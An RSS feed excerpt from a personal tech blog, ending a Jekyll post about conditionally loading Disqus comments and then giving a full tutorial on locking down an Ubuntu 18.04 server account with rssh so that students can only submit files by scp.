  &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; disqus_identifier &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{{&lt;/span&gt; page&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;id &lt;span class=&quot;token delimiter punctuation&quot;&gt;}}&lt;/span&gt;&lt;/span&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;/* * * DON&apos;T EDIT BELOW THIS LINE * * */&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; page&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;include_comments&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;embed &lt;span class=&quot;token operator&quot;&gt;or&lt;/span&gt; layout&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;include_comments&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;embed &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; dsq &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;script&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; dsq&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;text/javascript&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; dsq&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;async &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      dsq&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;src &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;//&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; disqus_shortname &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;.disqus.com/embed.js&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;head&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;body&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dsq&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; page&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;include_comments&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;count &lt;span class=&quot;token operator&quot;&gt;or&lt;/span&gt; layout&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;include_comments&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;count &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; s &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;script&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;text/javascript&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;async &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;src &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;//&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; disqus_shortname &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;.disqus.com/count.js&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;HEAD&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;BODY&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;noscript&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Please enable JavaScript to view the &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;a&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://disqus.com/?ref_noscript&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;nofollow&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;comments powered by Disqus.&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;noscript&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I hope you found this post useful and informative. The main thing I learned during researching and implementing this solution was that the default Jekyll environment is development, and the default GitHub pages Jekyll environment is production. This makes it exceptionally easy to enable or disable specific website content. If you have any feedback, questions or clarifications, please leave a comment below. Thanks!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Restricting SSH Access using rssh]]></title><description><![CDATA[This post summarizes a simple method to secure, or lock-down, SSH access using the Restricted SSH () package. The basic premise, you can…]]></description><link>https://thomaslaurenson.com/blog/2018-09-07/restricting-ssh-access-using-rssh/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-09-07/restricting-ssh-access-using-rssh/</guid><pubDate>Fri, 07 Sep 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post summarizes a simple method to secure, or lock-down, SSH access using the &lt;em&gt;Restricted SSH&lt;/em&gt; (&lt;code class=&quot;language-text&quot;&gt;rssh&lt;/code&gt;) package. The basic premise, you can create a user with a restricted shell and allow only specific protocols such as SCP or SFTP. There are many reasons to restrict SSH access or restrict SSH access to specific accounts. I used &lt;code class=&quot;language-text&quot;&gt;rssh&lt;/code&gt; on an assessment server in one of the papers I teach. I wanted students to be able to submit an assessment using a simple bash script, that SCP transferred a single file to a server. But, I did not want students to be able to log into the machine remotely - as they would be able to see assessment submissions from other students. &lt;/p&gt;
&lt;p&gt;This post documents the method I used to configure Restricted SSH on an Ubuntu Linux 18.04 server system, but the general principles can be applied to other Debian-based operating systems.&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#installing-rssh&quot;&gt;Installing RSSH&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#creating-a-restricted-user-account&quot;&gt;Creating a Restricted User Account&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configuring-restricted-ssh&quot;&gt;Configuring Restricted SSH&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;installing-rssh&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#installing-rssh&quot; aria-label=&quot;installing rssh permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing RSSH&lt;/h2&gt;
&lt;p&gt;According to the &lt;a href=&quot;https://packages.ubuntu.com/bionic/rssh&quot;&gt;Ubuntu Packages documentation for rssh&lt;/a&gt;, the &lt;code class=&quot;language-text&quot;&gt;rssh&lt;/code&gt; package is in the &lt;em&gt;universe&lt;/em&gt; repository. This specific repository should be enabled by default in Ubuntu server version 18.04, therefore, installation is easy using the following &lt;code class=&quot;language-text&quot;&gt;apt&lt;/code&gt; command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install rssh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;creating-a-restricted-user-account&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#creating-a-restricted-user-account&quot; aria-label=&quot;creating a restricted user account permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Creating a Restricted User Account&lt;/h2&gt;
&lt;p&gt;The only requirement for restricting a user using the Restricted SSH package is to specify &lt;code class=&quot;language-text&quot;&gt;/usr/bin/rssh&lt;/code&gt; as the users default shell. This would replace the usual default shell, which in most cases would be &lt;code class=&quot;language-text&quot;&gt;/bin/bash&lt;/code&gt;. You can either specify the Restricted SSH shell on user creation (if you wanted to create a new, dedicated user) or change the shell for an existing user.&lt;/p&gt;
&lt;p&gt;The following command creates a new user named &lt;code class=&quot;language-text&quot;&gt;student&lt;/code&gt; that has the &lt;code class=&quot;language-text&quot;&gt;rssh&lt;/code&gt; shell specified as the default shell for the user. It also creates a home directory with the same naming convention as the username (&lt;code class=&quot;language-text&quot;&gt;/home/student&lt;/code&gt;). The home directory is not required, however, in my case I use the home directory as the SCP upload target.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo useradd -d /home/student -m -s /usr/bin/rssh student&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can also change the shell of an existing user account using the &lt;code class=&quot;language-text&quot;&gt;chsh&lt;/code&gt; command. The following command will change the shell for the &lt;code class=&quot;language-text&quot;&gt;student&lt;/code&gt; account to the &lt;code class=&quot;language-text&quot;&gt;rssh&lt;/code&gt; shell. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo chsh -s /usr/bin/rssh student&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In both scenarios, make sure the user account has a password specified. This can be done with the &lt;code class=&quot;language-text&quot;&gt;passwd&lt;/code&gt; command. For example:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo passwd student&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;configuring-restricted-ssh&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configuring-restricted-ssh&quot; aria-label=&quot;configuring restricted ssh permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configuring Restricted SSH&lt;/h2&gt;
&lt;p&gt;The Restricted SSH configuration file is stored at: &lt;code class=&quot;language-text&quot;&gt;/etc/rssh.conf&lt;/code&gt;. Using this configuration file, you can restrict what services a user can access. The following configurations are supported by Restricted SSH:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;allowscp&lt;/code&gt;: User is allowed to use perform SCP transfers&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;allowsftp&lt;/code&gt;: User is allowed to use SFTP protocol and transfers&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;allowcvs&lt;/code&gt;: User is allowed to use the CVS service&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;allowrdist&lt;/code&gt;: User is allowed to use rdist transfers&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;allowrsync&lt;/code&gt;: User is allowed to use rsync transfers&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once you have Restricted SSH installed, you can configure what services a user is allowed to use. Start by opening the configuration file (feel free to use &lt;code class=&quot;language-text&quot;&gt;nano&lt;/code&gt; if you are not comfortable with &lt;code class=&quot;language-text&quot;&gt;vim&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo vim /etc/rssh.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The code snippet below displays the start of the Restricted SSH configuration file. I have only made one change, enabling SCP by uncommenting the &lt;code class=&quot;language-text&quot;&gt;allowscp&lt;/code&gt; line. Each configuration is easy to enable, simply remove the comment character (&lt;code class=&quot;language-text&quot;&gt;#&lt;/code&gt;) at the start of the required line.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# This is the default rssh config file

# set the log facility.  &quot;LOG_USER&quot; and &quot;user&quot; are equivalent.
logfacility = LOG_USER

# Leave these all commented out to make the default action for rssh to lock
# users out completely...

allowscp
#allowsftp
#allowcvs
#allowrdist
#allowrsync
#allowsvnserve

# set the default umask
umask = 022&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure to save the file before exiting. After the changes, the &lt;code class=&quot;language-text&quot;&gt;student&lt;/code&gt; account should only be allowed to perform SCP transfers, and should not have any other access to the system. To test this, try to log into the remote server using an SSH client. In the following example, the IP address of the server is &lt;code class=&quot;language-text&quot;&gt;10.25.1.10&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ssh student@10.25.1.10&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It might initially seem that you can log in using SSH without error. The SSH session will start and present the user with a login prompt to enter the password. The server information is then displayed… However, an error message will be displayed, informing the user that the account is restricted by &lt;code class=&quot;language-text&quot;&gt;rssh&lt;/code&gt;. The following code snippet provides an example of the error message.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;manager@server:~$ ssh student@10.25.1.10
student@10.25.1.10&apos;s password:
...
This account is restricted by rssh.
Allowed commands: scp

If you believe this is in error, please contact your system administrator.

Connection to 10.25.1.10 closed.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Final test. We should make sure the server allows the &lt;code class=&quot;language-text&quot;&gt;student&lt;/code&gt; account to perform an SCP transfer. The following command attempts to copy a file from the local system to the remote server (&lt;code class=&quot;language-text&quot;&gt;10.25.1.10&lt;/code&gt;). In this case, the file being copied is named &lt;code class=&quot;language-text&quot;&gt;kittens.png&lt;/code&gt; and the file is being copied to the &lt;code class=&quot;language-text&quot;&gt;/sharedData&lt;/code&gt; directory on the remote server. It is essential to check that the target directory (&lt;code class=&quot;language-text&quot;&gt;/sharedData&lt;/code&gt; in this case) is accessible (writable) by the &lt;code class=&quot;language-text&quot;&gt;student&lt;/code&gt; account. Therefore, you need to set the ownership/permissions accordingly.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;scp -P 22 kittens.png student@10.25.1.10:&quot;/sharedData/&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If everything is working correctly, the file should be copied to the remote server without error. The code snippet below displays an example of a successful transfer.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;user@server:~$ scp -P 22 kittens.png student@10.25.1.10:&quot;/sharedData&quot;
student@10.25.1.10&apos;s password:
kittens.png                          100%  107KB 107.0KB/s   00:00&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the case of an error, it might be useful to check the error code returned by the &lt;code class=&quot;language-text&quot;&gt;scp&lt;/code&gt; command. For example, you can use &lt;code class=&quot;language-text&quot;&gt;echo $?&lt;/code&gt; directly after running the &lt;code class=&quot;language-text&quot;&gt;scp&lt;/code&gt; command to see the error code to determine any problems with the transfer. Unfortunately, the &lt;code class=&quot;language-text&quot;&gt;scp&lt;/code&gt; man page does not document the error codes, but &lt;a href=&quot;https://support.microfocus.com/kb/doc.php?id=7021696&quot;&gt;MicroFocus provide a list of SSH and SCP return codes&lt;/a&gt;.&lt;/p&gt;
